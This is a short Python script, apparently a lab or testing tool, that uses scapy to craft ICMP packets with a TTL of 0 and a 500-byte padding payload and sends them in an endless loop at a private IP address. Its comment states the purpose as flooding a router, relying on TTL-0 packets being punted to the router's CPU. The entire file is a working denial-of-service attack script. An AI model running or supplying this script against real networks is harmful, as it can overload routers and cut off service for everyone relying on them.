#!venv/bin/python

from scapy.all import *
from scapy.all import Ether, IP, ICMP

"""
Sending a lot of tll0 pings to flooding router. ttl0 packet are still copied to CPU !
"""

source_interface = "Ethernet"
destination_ip = "192.168.80.81"

pck = Ether()/IP(dst=destination_ip, ttl=0)/ICMP()/Raw(b"X" * 500)
pck.show()
sendp(pck, iface=source_interface, loop=1)